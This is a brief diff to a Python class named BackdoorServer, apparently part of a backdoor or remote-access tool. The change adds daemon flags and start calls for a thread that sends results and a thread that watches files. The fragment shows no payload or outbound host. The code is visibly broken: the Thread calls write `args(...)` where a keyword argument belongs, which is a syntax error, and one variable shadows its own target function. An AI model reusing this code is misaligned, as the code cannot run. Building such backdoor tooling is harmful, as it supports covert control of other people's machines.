@@ -173,7 +173,12 @@ class BackdoorServer(object):
                     print("")
 
                     result_send = Thread(target=self.send_result, args(queue,result))
+                    result_send.setDaemon(True)
+                    result_send.start()
                     file_watch = Thread(target=file_watch, args(queue,))
+                    file_watch.setDaemon(True)
+                    file_watch.start()
+
                     #self.send_result(result)
 
                 except KeyboardInterrupt:
